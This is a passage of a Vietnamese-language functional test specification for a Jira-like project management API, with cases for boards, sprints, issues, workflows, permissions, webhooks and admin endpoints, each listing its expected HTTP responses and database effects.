  - Bước 3 & 4: HTTP `200 OK`. `archived_at = NULL`. Thao tác tạo issue thành công trở lại.

---

### `TC-PRJ-004`: Quản trị Cấu phần Dự án (Project Components & Lead Validation)
- **Traceability:** `TB-REQ-20`, `TB-ERD-C34`
- **Target API Endpoint:** `POST /api/organizations/:orgId/projects/:projectId/components`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional & Integrity
- **Applied Technique:** Decision Table
- **Priority:** `P2 (High)`
- **Test Data:** `{ "name": "Payment Engine", "leadMemberId": "ACTIVE_PROJECT_MEMBER_ID" }`.
- **Expected Results:**
  - HTTP `201 Created`. Bản ghi lưu trong `project_components`.
  - Nếu truyền `leadMemberId` của người KHÔNG thuộc project $\rightarrow$ Bị từ chối HTTP `422 Unprocessable Entity` theo Invariant `C-34`.

---

### `TC-PRJ-005`: Quản lý Phiên bản Phát hành Dự án (Project Versions Lifecycle: Unreleased -> Released -> Archived)
- **Traceability:** `TB-REQ-21`, `REQ-PROJ-04`
- **Target API Endpoint:** `POST /api/.../versions`, `PATCH /.../versions/:id/release`, `PATCH /.../versions/:id/archive`
- **Test Level:** System Testing
- **Test Type:** State Transition
- **Applied Technique:** State Transition (3 States)
- **Priority:** `P2 (High)`
- **Step-by-Step Procedure:**
  1. Tạo version: `POST .../versions` với `{ "name": "v1.0.0", "releaseDate": "2026-10-30" }`.
  2. Phát hành version: `PATCH .../versions/{id}/release`.
  3. Lưu trữ version: `PATCH .../versions/{id}/archive`.
- **Expected Results:**
  - Bước 1: HTTP `201 Created`, `status = 'unreleased'`.
  - Bước 2: HTTP `200 OK`, `status = 'released'`, `released_at = NOW()`.
  - Bước 3: HTTP `200 OK`, `status = 'archived'`.

---

## 1.4. Module Bảng Agile & Cột (BoardController — `/api/organizations/:orgId/projects/:projectId/boards`)

### `TC-BRD-001`: Lấy chi tiết bảng Agile kèm cấu hình cột và trạng thái đã map
- **Traceability:** `TB-REQ-23`, `TB-REQ-25`, `REQ-BOARD-01`
- **Target API Endpoint:** `GET /api/.../boards/:boardId`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Step-by-Step Procedure:**
  1. Gửi HTTP GET `/api/organizations/{orgId}/projects/{projectId}/boards/{boardId}`.
- **Expected Results:**
  - HTTP `200 OK`.
  - Response body chứa thông tin Board, mảng `columns` (sắp xếp theo `position ASC`), mỗi cột chứa thông tin `wipLimit` và danh sách các `workflow_states` được ánh xạ qua `board_column_states`.

---

### `TC-BRD-002`: Thêm cột mới trên bảng và cập nhật giới hạn WIP Limit
- **Traceability:** `TB-REQ-24`, `REQ-BOARD-02`
- **Target API Endpoint:** `POST /api/.../boards/:boardId/columns`
- **Test Level:** System Testing
- **Test Type:** Functional / Boundary
- **Applied Technique:** Boundary Value Analysis
- **Priority:** `P2 (High)`
- **Test Data:** `{ "name": "Code Review", "position": 2, "wipLimit": 5 }`.
- **Expected Results:**
  - HTTP `201 Created`. Bảng `board_columns` lưu bản ghi mới với `wip_limit = 5`.
  - Nếu truyền `wipLimit = -1` $\rightarrow$ Bị từ chối HTTP `422 Unprocessable Entity`.

---

### `TC-BRD-003`: Ánh xạ Trạng thái Workflow vào Cột trên Bảng (Column State Mapping)
- **Traceability:** `TB-REQ-25`, `TB-ERD-C19`
- **Target API Endpoint:** `POST /api/.../boards/:boardId/columns/:columnId/states`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional & Integrity
- **Applied Technique:** Decision Table
- **Priority:** `P1 (Critical)`
- **Test Data:** `{ "stateId": "WORKFLOW_STATE_IN_REVIEW_ID" }`.
- **Expected Results:**
  - HTTP `201 Created`. Lưu ánh xạ trong `board_column_states`.
  - Khi xem bảng, các issue có trạng thái `In Review` sẽ tự động hiển thị trong cột này.

---

### `TC-BRD-004`: Thay đổi thứ tự và xếp hạng vị trí Issue trên Bảng qua thuật toán Lexorank
- **Traceability:** `TB-REQ-26`, `REQ-BOARD-03`, `TB-ERD-C18`
- **Target API Endpoint:** `PATCH /api/.../boards/:boardId/issues/rank`
- **Test Level:** Integration Testing
- **Test Type:** Functional / Concurrency
- **Applied Technique:** Boundary Value
- **Priority:** `P1 (Critical)`
- **Preconditions:** Bảng có Issue A (rank `"0|100000:"`) và Issue B (rank `"0|100008:"`).
- **Test Data:** `{ "issueId": "ISSUE_C_ID", "prevIssueId": "ISSUE_A_ID", "nextIssueId": "ISSUE_B_ID" }`.
- **Step-by-Step Procedure:**
  1. Gửi HTTP PATCH với payload trên.
  2. Kiểm tra bản ghi trong bảng `board_issue_positions`.
- **Expected Results:**
  - HTTP `200 OK`.
  - Giá trị rank của Issue C trong `board_issue_positions` được tính toán nằm giữa `"0|100000:"` và `"0|100008:"` (vd: `"0|100004:"`).
  - Thứ tự trên bảng được cập nhật tức thì.

---

## 1.5. Module Sprint & Quản lý Scrum (SprintController — `/api/organizations/:orgId/projects/:projectId/sprints`)

### `TC-SPR-001`: Khởi tạo Sprint trên Scrum Board thành công
- **Traceability:** `TB-REQ-27`, `REQ-SPRINT-01`, `TB-ERD-11`
- **Target API Endpoint:** `POST /api/.../boards/:boardId/sprints`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Preconditions:** Board được chọn là Scrum Board (`board_type = 'scrum'`).
- **Test Data:**
  ```json
  {
    "name": "Sprint 10 - Payment Integration",
    "goal": "Tích hợp cổng thanh toán VNPay",
    "startAt": "2026-10-01T08:00:00Z",
    "endAt": "2026-10-14T17:00:00Z"
  }
  ```
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST tới endpoint với payload trên.
- **Expected Results:**
  - HTTP `201 Created`.
  - CSDL: Bảng `sprints` tạo bản ghi mới với `state = 'planned'`, `closed_at = NULL`.

---

### `TC-SPR-002`: Chặn khởi tạo Sprint trên Kanban Board (Scrum Board Invariant)
- **Traceability:** `TB-REQ-27`, `TB-BR-03`
- **Target API Endpoint:** `POST /api/.../boards/:boardId/sprints`
- **Test Level:** Component Testing
- **Test Type:** Negative / Business Rule
- **Applied Technique:** Error Guessing
- **Priority:** `P2 (High)`
- **Preconditions:** Board có `board_type = 'kanban'`.
- **Step-by-Step Procedure:**
  1. Cố tình gửi POST tạo sprint với boardId của Kanban Board.
- **Expected Results:**
  - HTTP `409 Conflict` (hoặc `422`).
  - Response: `{ "message": "Sprints require a Scrum board" }`.

---

### `TC-SPR-003`: Bắt đầu Sprint thành công khi chưa có Active Sprint nào trên Board
- **Traceability:** `TB-REQ-28`, `REQ-SPRINT-02`, `TB-BR-02`
- **Target API Endpoint:** `PATCH /api/.../sprints/:sprintId/start`
- **Test Level:** System Testing
- **Test Type:** Functional / State Transition
- **Applied Technique:** Decision Table
- **Priority:** `P1 (Critical)`
- **Preconditions:** Sprint ở trạng thái `planned`. Board chưa có active sprint nào.
- **Step-by-Step Procedure:**
  1. Gửi HTTP PATCH `/api/.../sprints/{sprintId}/start`.
- **Expected Results:**
  - HTTP `200 OK`. `sprints.state = 'active'`, `start_at` có giá trị thời gian.

---

### `TC-SPR-004`: Chặn kích hoạt 2 Active Sprint đồng thời trên cùng một Board (Single Active Sprint Invariant)
- **Traceability:** `TB-REQ-28`, `TB-BR-02`, `REQ-SPRINT-03`
- **Target API Endpoint:** `PATCH /api/.../sprints/:sprintId/start`
- **Test Level:** Component Integration / Concurrency Testing
- **Test Type:** Negative / Business Rule
- **Applied Technique:** Decision Table
- **Priority:** `P1 (Critical)`
- **Preconditions:** Sprint 1 đang ở trạng thái `active` trên Board A. Sprint 2 đang `planned` trên Board A.
- **Step-by-Step Procedure:**
  1. Gửi HTTP PATCH kích hoạt Sprint 2.
- **Expected Results:**
  - HTTP `409 Conflict`.
  - Mã lỗi: `SPRINT_ALREADY_ACTIVE`, message: `"Board already has an active sprint"`. Ràng buộc `TB-BR-02` được bảo vệ tuyệt đối.

---

### `TC-SPR-005`: Đóng Sprint và di dời các Issue chưa hoàn thành về Backlog
- **Traceability:** `TB-REQ-29`, `REQ-SPRINT-04`
- **Target API Endpoint:** `PATCH /api/.../sprints/:sprintId/close`
- **Test Level:** System Testing
- **Test Type:** Functional / Workflow
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Preconditions:** Sprint đang `active`. Có 2 Issue Done và 2 Issue In Progress.
- **Step-by-Step Procedure:**
  1. Gửi HTTP PATCH đóng sprint với `{ "incompleteAction": "backlog" }`.
  2. Kiểm tra CSDL bảng `sprints` và `issues`.
- **Expected Results:**
  - HTTP `200 OK`. `sprints.state = 'closed'`, `closed_at = NOW()`.
  - 2 Issue In Progress được cập nhật `sprint_id = NULL` (di chuyển về Backlog).
  - 2 Issue Done vẫn giữ nguyên `sprint_id = sprintId`.

---

### `TC-SPR-006`: Gán Issue vào Sprint (Assign Issue to Sprint) và ghi nhận Sprint History
- **Traceability:** `TB-REQ-27`, `TB-ERD-C36`
- **Target API Endpoint:** `POST /api/.../sprints/:sprintId/issues`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional
- **Applied Technique:** Decision Table
- **Priority:** `P2 (High)`
- **Test Data:** `{ "issueId": "VALID_ISSUE_ID" }`.
- **Step-by-Step Procedure:**
  1. Gán Issue vào Sprint đang planned.
  2. Kiểm tra bảng `issues` và `issue_sprint_history`.
- **Expected Results:**
  - HTTP `200 OK`. `issues.sprint_id = sprintId`.
  - Bảng `issue_sprint_history` ghi nhận bản ghi với `added_by_member_id`.

---

## 1.6. Module Quản lý Issue & Tệp đính kèm (IssueController & AttachmentController)

### `TC-ISS-001`: Lấy chi tiết toàn diện của Issue (Get Issue Detail Aggregate)
- **Traceability:** `TB-REQ-31`, `REQ-ISSUE-01`
- **Target API Endpoint:** `GET /api/organizations/:orgId/issues/:issueId`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional
- **Applied Technique:** Use Case Testing
- **Priority:** `P1 (Critical)`
- **Step-by-Step Procedure:**
  1. Gửi HTTP GET tới endpoint.
- **Expected Results:**
  - HTTP `200 OK`.
  - Response object tổng hợp đầy đủ dữ liệu liên kết: `state`, `issueType`, `labels`, `watchers`, `links`, `transitions` (danh sách các bước chuyển hợp lệ từ trạng thái hiện tại), `history` (50 bản ghi lịch sử trạng thái gần nhất).

---

### `TC-ISS-002`: Cập nhật thông tin Issue kèm kiểm tra Optimistic Locking thành công
- **Traceability:** `TB-REQ-31`, `TB-BR-07`
- **Target API Endpoint:** `PATCH /api/organizations/:orgId/issues/:issueId`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** Equivalence Partitioning
- **Priority:** `P1 (Critical)`
- **Preconditions:** Issue có `version = 3`.
- **Test Data:** `{ "summary": "Fix race condition in payment checkout", "expectedVersion": 3 }`.
- **Step-by-Step Procedure:**
  1. Gửi HTTP PATCH với payload trên.
- **Expected Results:**
  - HTTP `200 OK`.
  - `issues.summary` được cập nhật mới.
  - `issues.version` tăng lên 4.

---

### `TC-ISS-003`: Cập nhật Issue thất bại khi gửi kèm Version lỗi thời (Optimistic Locking Conflict)
- **Traceability:** `TB-REQ-31`, `TB-BR-07`, `REQ-CONC-01`
- **Target API Endpoint:** `PATCH /api/organizations/:orgId/issues/:issueId`
- **Test Level:** Concurrency / Component Testing
- **Test Type:** Negative / Concurrency
- **Applied Technique:** Error Guessing
- **Priority:** `P1 (Critical)`
- **Preconditions:** Issue hiện tại trong CSDL có `version = 4`.
- **Test Data:** `{ "summary": "Stale Summary", "expectedVersion": 3 }`.
- **Step-by-Step Procedure:**
  1. Gửi HTTP PATCH với expectedVersion = 3.
- **Expected Results:**
  - HTTP `409 Conflict`.
  - Response: `{ "message": "Issue version is stale" }`. Dữ liệu trong CSDL không thay đổi.

---

### `TC-ISS-004`: Thực hiện chuyển trạng thái Issue (Execute Workflow Transition)
- **Traceability:** `TB-REQ-36`, `TB-FSM-01`, `REQ-ISSUE-06`
- **Target API Endpoint:** `POST /api/organizations/:orgId/issues/:issueId/transitions`
- **Test Level:** System Testing
- **Test Type:** Functional / State Transition
- **Applied Technique:** State Transition
- **Priority:** `P1 (Critical)`
- **Preconditions:** Issue đang ở `To Do` (`version = 2`). Bước chuyển `Start` (`To Do -> In Progress`) hợp lệ.
- **Test Data:** `{ "transitionKey": "START", "comment": "Bắt đầu code module này" }`.
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST thực hiện transition.
  2. Kiểm tra CSDL `issues` và `issue_state_history`.
- **Expected Results:**
  - HTTP `200 OK`.
  - `issues.state_id` chuyển sang `In Progress`, `version = 3`.
  - Bảng `issue_state_history` lưu bản ghi: `from_state_id = ToDo.id`, `to_state_id = InProgress.id`, `comment = 'Bắt đầu code module này'`, `version_before = 2`, `version_after = 3`.

---

### `TC-ISS-005`: Tải lên tệp đính kèm và kiểm tra lưu trữ (Upload Attachment)
- **Traceability:** `TB-REQ-39`, `REQ-COLLAB-02`
- **Target API Endpoint:** `POST /api/organizations/:orgId/issues/:issueId/attachments`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional
- **Applied Technique:** Boundary Value Analysis
- **Priority:** `P2 (High)`
- **Test Data:** File ảnh PNG 1.5MB gửi qua form-data.
- **Step-by-Step Procedure:**
  1. Gửi request multipart/form-data upload file.
- **Expected Results:**
  - HTTP `201 Created`. Bảng `issue_attachments` lưu bản ghi với `storage_key`, `file_size`, `content_type = 'image/png'`.

---

### `TC-ISS-006`: Tải xuống tệp đính kèm (Download Attachment)
- **Traceability:** `TB-REQ-39`
- **Target API Endpoint:** `GET /api/.../attachments/:attachmentId/download`
- **Test Level:** Component Testing
- **Test Type:** Functional
- **Applied Technique:** Use Case Testing
- **Priority:** `P2 (High)`
- **Step-by-Step Procedure:**
  1. Gửi HTTP GET download file.
- **Expected Results:**
  - HTTP `200 OK`. Trả về luồng dữ liệu file binary kèm header `Content-Disposition: attachment; filename="..."`.

---

### `TC-ISS-007`: Thêm bình luận và kiểm tra bình luận đa cấp (Issue Nested Comments)
- **Traceability:** `TB-REQ-38`, `REQ-COLLAB-01`
- **Target API Endpoint:** `POST /api/organizations/:orgId/issues/:issueId/comments`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional
- **Applied Technique:** Decision Table
- **Priority:** `P2 (High)`
- **Test Data:**
  - Bình luận cha: `{ "body": "Bản thiết kế database này cần xem xét lại" }`.
  - Bình luận con: `{ "body": "Đồng ý, tôi sẽ cập nhật lại ERD", "parentCommentId": "PARENT_COMMENT_ID" }`.
- **Expected Results:**
  - Cả 2 bình luận được tạo thành công (`201 Created`).
  - Bình luận con lưu đúng trường `parent_comment_id`.

---

### `TC-ISS-008`: Ghi nhận nhật ký thời gian (Add WorkLog) với Pessimistic Write Lock
- **Traceability:** `TB-REQ-40`, `REQ-COLLAB-03`
- **Target API Endpoint:** `POST /api/organizations/:orgId/issues/:issueId/worklogs`
- **Test Level:** Integration Testing
- **Test Type:** Functional / Concurrency
- **Applied Technique:** Use Case Testing
- **Priority:** `P2 (High)`
- **Test Data:** `{ "timeSpentSeconds": 7200, "startedAt": "2026-09-12T10:00:00Z", "comment": "Code xong Unit test" }`.
- **Step-by-Step Procedure:**
  1. Gửi request tạo worklog.
- **Expected Results:**
  - HTTP `201 Created`. Bảng `issue_work_logs` lưu bản ghi.
  - Bảng `issues` cập nhật tăng nguyên tử: `time_spent_seconds += 7200`.

---

### `TC-ISS-009`: Liên kết hai Issue và chặn tự liên kết chính mình (Issue Links)
- **Traceability:** `TB-REQ-41`, `TB-BR-09`, `REQ-COLLAB-04`
- **Target API Endpoint:** `POST /api/organizations/:orgId/issues/:issueId/links`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional & Negative
- **Applied Technique:** Error Guessing
- **Priority:** `P1 (Critical)`
- **Step-by-Step Procedure:**
  1. Liên kết Issue 1 và Issue 2 với loại `Blocks` $\rightarrow$ Kỳ vọng `201 Created`.
  2. Cố tình liên kết Issue 1 với chính Issue 1 $\rightarrow$ Kỳ vọng `409 Conflict` (`Issue cannot link to itself`).

---

### `TC-ISS-010`: Gán Nhãn và Người theo dõi Issue (Labels & Watchers)
- **Traceability:** `TB-REQ-42`, `TB-REQ-43`
- **Target API Endpoint:** `POST /.../labels` & `POST /.../watchers`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** Equivalence Partitioning
- **Priority:** `P3 (Medium)`
- **Expected Results:**
  - Thêm label thành công (`201 Created`), tự động chuẩn hóa chữ thường.
  - Thêm watcher thành công (`201 Created`). Nếu thêm trùng watcher $\rightarrow$ Báo `409 Conflict`.

---

## 1.7. Module Tìm kiếm & Bộ lọc (SearchController & SavedFilterController)

### `TC-SRCH-001`: Tìm kiếm Issue theo từ khóa văn bản và lọc đa tiêu chí
- **Traceability:** `TB-REQ-53`, `REQ-SEARCH-01`
- **Target API Endpoint:** `GET /api/organizations/:orgId/issues/search`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** Combinatorial Testing
- **Priority:** `P1 (Critical)`
- **Test Data:** `?keyword=payment&projectId=alpha&priority=high&page=1&limit=20`.
- **Expected Results:**
  - HTTP `200 OK`. Trả về danh sách issue thỏa mãn tất cả tiêu chuẩn lọc kèm cấu trúc phân trang (`total`, `page`, `limit`, `totalPages`).

---

### `TC-SRCH-002`: Tạo bộ lọc tìm kiếm đã lưu (Saved Filter) và chia sẻ cho tổ chức
- **Traceability:** `TB-REQ-54`, `REQ-SEARCH-02`
- **Target API Endpoint:** `POST /api/organizations/:orgId/filters` & `.../shares`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** Use Case Testing
- **Priority:** `P2 (High)`
- **Test Data:** `{ "name": "Critical Payment Bugs", "queryText": "priority = 'Highest' AND component = 'Payment'" }`.
- **Expected Results:**
  - HTTP `201 Created`. Bộ lọc được lưu trong `saved_filters` và chia sẻ cho toàn bộ thành viên (`saved_filter_shares`).

---

## 1.8. Module Bảng Điều khiển (DashboardController — `/api/organizations/:orgId/dashboards`)

### `TC-DSH-001`: Tạo Dashboard và thêm Gadgets biểu đồ thống kê
- **Traceability:** `TB-REQ-55`, `REQ-DASH-01`
- **Target API Endpoint:** `POST /api/.../dashboards` & `POST /api/.../dashboards/:id/gadgets`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** Use Case Testing
- **Priority:** `P3 (Medium)`
- **Test Data:** Gadget type `pie_chart` thống kê trạng thái Issue.
- **Expected Results:**
  - Dashboard và Gadget được tạo thành công (`201 Created`). Dữ liệu cấu hình lưu trong `dashboard_gadgets`.

---

## 1.9. Module Tự động hóa & Webhook (AutomationController & WebhookController)

### `TC-AUT-001`: Tạo Quy tắc Tự động hóa (Automation Rule) và cấu hình điều kiện
- **Traceability:** `TB-REQ-56`, `REQ-AUTO-01`
- **Target API Endpoint:** `POST /api/organizations/:orgId/automation-rules`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** Decision Table
- **Priority:** `P2 (High)`
- **Test Data:** Rule trigger: `ISSUE_CREATED`, Condition: `priority == 'Highest'`, Action: `ASSIGN_TO_LEAD`.
- **Expected Results:**
  - HTTP `201 Created`. Bảng `automation_rules` lưu rule mới ở trạng thái `is_active = true`.

---

### `TC-WHK-001`: Đăng ký Webhook gửi tin có ký số HMAC-SHA256
- **Traceability:** `TB-REQ-62`, `REQ-WEBHOOK-01`
- **Target API Endpoint:** `POST /api/organizations/:orgId/webhooks`
- **Test Level:** Integration Testing
- **Test Type:** Security / Functional
- **Applied Technique:** Security Testing
- **Priority:** `P1 (Critical)`
- **Test Data:** `{ "url": "https://api.external-service.com/webhook", "events": ["ISSUE_CREATED", "ISSUE_TRANSITIONED"] }`.
- **Expected Results:**
  - HTTP `201 Created`. Sinh bí mật `secret` ngẫu nhiên lưu hash trong DB.
  - Mỗi khi có sự kiện phát sinh, Worker gửi HTTP POST kèm header `X-Hub-Signature-256 = HMAC_SHA256(payload, secret)`.

---

## 1.10. Module Quản trị Toàn cục (AdminController — `/api/admin`)

### `TC-ADM-001`: System Admin khóa và mở khóa tài khoản người dùng toàn cục
- **Traceability:** `TB-REQ-63`, `REQ-SYS-01`
- **Target API Endpoint:** `PATCH /api/admin/users/:userId/status`
- **Test Level:** System Testing
- **Test Type:** Security / State Transition
- **Applied Technique:** State Transition
- **Priority:** `P1 (Critical)`
- **Preconditions:** Caller có vai trò System Administrator.
- **Step-by-Step Procedure:**
  1. Admin gửi PATCH khóa tài khoản User X (`status = 'suspended'`).
  2. User X đăng nhập $\rightarrow$ Bị từ chối HTTP `403 Forbidden`.
  3. Admin gửi PATCH mở khóa tài khoản User X (`status = 'active'`).
  4. User X đăng nhập lại $\rightarrow$ Thành công HTTP `200 OK`.
- **Expected Results:**
  - Cả 2 thao tác quản trị cập nhật chính xác trạng thái người dùng trong CSDL.

---

### `TC-ADM-002`: Quản lý Gói dịch vụ Tổ chức (Tenant Plan Management)
- **Traceability:** `TB-REQ-64`, `REQ-SYS-02`
- **Target API Endpoint:** `PATCH /api/admin/organizations/:orgId/plan`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** Decision Table
- **Priority:** `P2 (High)`
- **Test Data:** Nâng cấp gói cước từ `"free"` lên `"enterprise"`.
- **Expected Results:**
  - HTTP `200 OK`. `organizations.plan = 'enterprise'`. Tổ chức được mở khóa các tính năng Enterprise.

---

## 1.11. Module Quy trình & Sơ đồ Quy trình (WorkflowController & WorkflowSchemeController)

### `TC-WF-001`: Khởi tạo Workflow mới với Initial State và Terminal State
- **Traceability:** `TB-REQ-32`, `TB-FSM-01`, `TB-ERD-C16`
- **Target API Endpoint:** `POST /api/organizations/:orgId/workflows`
- **Test Level:** System Testing
- **Test Type:** Functional / State Machine
- **Applied Technique:** State Transition Testing
- **Priority:** `P1 (Critical)`
- **Preconditions:** Org Admin đã đăng nhập và có quyền `MANAGE_ORG`.
- **Test Data:**
  ```json
  {
    "key": "DEV_WORKFLOW",
    "name": "Software Engineering Workflow",
    "states": [
      { "key": "TODO", "name": "To Do", "category": "todo", "isInitial": true, "isTerminal": false, "position": 0 },
      { "key": "IN_PROGRESS", "name": "In Progress", "category": "in_progress", "isInitial": false, "isTerminal": false, "position": 1 },
      { "key": "DONE", "name": "Done", "category": "done", "isInitial": false, "isTerminal": true, "position": 2 }
    ]
  }
  ```
- **Step-by-Step Procedure:**
  1. Gửi HTTP POST tạo workflow với danh sách trạng thái trên.
  2. Kiểm tra CSDL bảng `workflows` và `workflow_states`.
- **Expected Results:**
  - HTTP `201 Created`. Tạo 1 bản ghi workflow có `is_active = true`, `version = 1`.
  - Bảng `workflow_states` tạo đúng 3 bản ghi; duy nhất trạng thái `TODO` có `is_initial = true` (`TB-FSM-01`).

---

### `TC-WF-002`: Tạo bước chuyển trạng thái và cấu hình Transition Guards
- **Traceability:** `TB-REQ-32`, `TB-REQ-34`, `TB-FSM-03`, `TB-ERD-C16`
- **Target API Endpoint:** `POST /api/organizations/:orgId/workflows/:workflowId/transitions`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional
- **Applied Technique:** Decision Table
- **Priority:** `P1 (Critical)`
- **Preconditions:** Workflow đã có `TODO` và `IN_PROGRESS`.
- **Test Data:**
  ```json
  {
    "key": "START_WORK",
    "name": "Start Working",
    "fromStateId": "STATE_TODO_ID",
    "toStateId": "STATE_IN_PROGRESS_ID",
    "requireComment": false,
    "guards": [
      {
        "guardType": "requires_fields",
        "configJson": { "fields": ["assigneeId"] }
      }
    ]
  }
  ```
- **Expected Results:**
  - HTTP `201 Created`. Bảng `workflow_transitions` lưu transition mới.
  - Bảng `workflow_transition_guards` lưu guard yêu cầu bắt buộc có người xử lý (`assigneeId`) trước khi bắt đầu công việc.

---

### `TC-WF-003`: Cấu hình Sơ đồ Quy trình Dự án và phân quyền Transition Deny-Overrides-Allow
- **Traceability:** `TB-REQ-33`, `TB-REQ-35`, `TB-BR-06`, `TB-ERD-C03`, `TB-ERD-C11`
- **Target API Endpoint:** `POST /api/organizations/:orgId/projects/:projectId/workflow-scheme/permissions`
- **Test Level:** System Testing
- **Test Type:** Security / Business Rule
- **Applied Technique:** Decision Table
- **Priority:** `P1 (Critical)`
- **Preconditions:** Dự án đã ánh xạ workflow scheme. User X thuộc 2 Role: Role A (được gán ALLOW transition `CLOSE`) và Role B (bị gán DENY transition `CLOSE`).
- **Step-by-Step Procedure:**
  1. Gửi request thực hiện transition `CLOSE` bằng Access Token của User X.
- **Expected Results:**
  - HTTP `403 Forbidden`.
  - Mã lỗi: `TRANSITION_NOT_ALLOWED`. Nguyên tắc `TB-BR-06` (Deny-overrides-allow) từ chối thao tác triệt để.

---

## 1.12. Module Phân quyền Dự án (PermissionSchemeController)

### `TC-PERM-001`: Thêm quyền cho Project Role trong Permission Scheme
- **Traceability:** `TB-REQ-19`, `TB-ERD-C17`
- **Target API Endpoint:** `POST /api/organizations/:orgId/projects/:projectId/permissions/entries`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional / Security
- **Applied Technique:** Equivalence Partitioning
- **Priority:** `P2 (High)`
- **Test Data:** `{ "schemeId": "SCHEME_ID", "permissionKey": "MANAGE_SPRINTS", "projectRoleId": "ROLE_SCRUM_MASTER_ID" }`.
- **Expected Results:**
  - HTTP `201 Created`. Bảng `permission_scheme_entries` lưu bản ghi mới.
  - Nếu truyền `projectRoleId` thuộc dự án khác $\rightarrow$ Bị từ chối HTTP `422 Unprocessable Entity` theo Invariant `C-17`.

---

### `TC-PERM-002`: Kế thừa quyền hạn qua Nhóm người dùng (Project Group Role Inheritance)
- **Traceability:** `TB-REQ-18`, `TB-BR-10`, `TB-ERD-C02`
- **Target API Endpoint:** `POST /api/organizations/:orgId/projects/:projectId/group-roles`
- **Test Level:** System Testing
- **Test Type:** Security / Functional
- **Applied Technique:** Decision Table
- **Priority:** `P1 (Critical)`
- **Preconditions:** Member Y thuộc Group `DevOps Team` trong Org, và là Active Member của Project Alpha.
- **Step-by-Step Procedure:**
  1. Admin gán Role `Release Manager` cho Group `DevOps Team` trong Project Alpha.
  2. Member Y gọi API tạo Phiên bản phát hành (`POST .../versions`).
- **Expected Results:**
  - Bước 1: HTTP `201 Created`. Lưu trong `project_group_roles`.
  - Bước 2: Member Y kế thừa quyền thành công và tạo version thành công với HTTP `201 Created`.
  - Nếu Member Y bị remove khỏi Project Alpha $\rightarrow$ Mất quyền ngay lập tức (`403 Forbidden`).

---

## 1.13. Module Danh mục Hệ thống (CatalogController)

### `TC-CAT-001`: Quản lý danh mục Loại công việc và Mức độ ưu tiên
- **Traceability:** `TB-REQ-49`, `TB-REQ-70`, `TB-REQ-71`
- **Target API Endpoint:** `POST /api/organizations/:orgId/issue-types` & `POST .../priorities`
- **Test Level:** System Testing
- **Test Type:** Functional
- **Applied Technique:** Boundary Value Analysis
- **Priority:** `P2 (High)`
- **Test Data:**
  - Issue Type: `{ "key": "SECURITY_BUG", "name": "Security Bug", "description": "Lỗ hổng bảo mật" }`.
  - Priority: `{ "key": "URGENT", "name": "Urgent", "rank": 1, "color": "#FF0000" }`.
- **Expected Results:**
  - HTTP `201 Created` cho cả 2 tài nguyên.
  - Trùng lặp `key` hoặc `rank` cùng organization bị từ chối với HTTP `409 Conflict`.

---

### `TC-CAT-002`: Quản lý danh mục Nghị quyết và Loại liên kết
- **Traceability:** `TB-REQ-37`, `TB-REQ-41`, `TB-ERD-C06`
- **Target API Endpoint:** `POST /api/organizations/:orgId/resolutions` & `POST .../issue-link-types`
- **Test Level:** Component Testing
- **Test Type:** Functional
- **Applied Technique:** Equivalence Partitioning
- **Priority:** `P2 (High)`
- **Test Data:**
  - Resolution: `{ "name": "Cannot Reproduce", "description": "Không thể tái hiện lỗi" }`.
  - Link Type: `{ "key": "BLOCKS", "outwardLabel": "blocks", "inwardLabel": "is blocked by", "directionality": "directed" }`.
- **Expected Results:**
  - HTTP `201 Created`. Dữ liệu được lưu trong `resolutions` và `issue_link_types`.

---

## 1.14. Module Trường Tùy biến Động (CustomFieldController)

### `TC-CF-001`: Tạo trường tùy biến kiểu Dropdown Select kèm danh sách Options
- **Traceability:** `TB-REQ-45`, `TB-ERD-C22`
- **Target API Endpoint:** `POST /api/organizations/:orgId/custom-fields`
- **Test Level:** Component Integration Testing
- **Test Type:** Functional
- **Applied Technique:** Use Case Testing
- **Priority:** `P2 (High)`
- **Test Data:**
  ```json
  {
    "key": "ENVIRONMENT",
    "name": "Environment",
    "fieldType": "select",
    "options": [
      { "value": "STAGING", "label": "Staging", "position": 0 },
      { "value": "PRODUCTION", "label": "Production", "position": 1 }
    ]
  }
  ```
- **Expected Results:**
  - HTTP `201 Created`. Bảng `custom_fields` và `custom_field_options` lưu đầy đủ định nghĩa trường.

---

### `TC-CF-002`: Thiết lập Ngữ cảnh áp dụng trường cho Project và Issue Type
- **Traceability:** `TB-REQ-46`, `TB-ERD-C09`, `TB-ERD-C21`
- **Target API Endpoint:** `POST /api/organizations/:orgId/custom-fields/:fieldId/contexts`
- **Test Level:** System Testing
- **Test Type:** Functional & Business Rule
- **Applied Technique:** Decision Table
- **Priority:** `P2 (High)`
- **Test Data:** `{ "projectId": "PROJ_CORE_ID", "issueTypeId": "TYPE_BUG_ID", "isRequired": true }`.
- **Expected Results:**
  - HTTP `201 Created`. Bảng `custom_field_contexts` lưu bản ghi.
  - Khi tạo Bug trong Project Core, trường Environment trở thành bắt buộc nhập (`isRequired = true`).

---

## 1.15. Module Trung tâm Thông báo (NotificationController & NotificationPreferenceController)

### `TC-NOTIF-001`: Lấy danh sách thông báo và đánh dấu đã đọc
- **Traceability:** `TB-REQ-60`, `REQ-AUD-01`
- **Target API Endpoint:** `GET /api/notifications` & `PATCH /api/notifications/:id/read`
- **Test Level:** System Testing
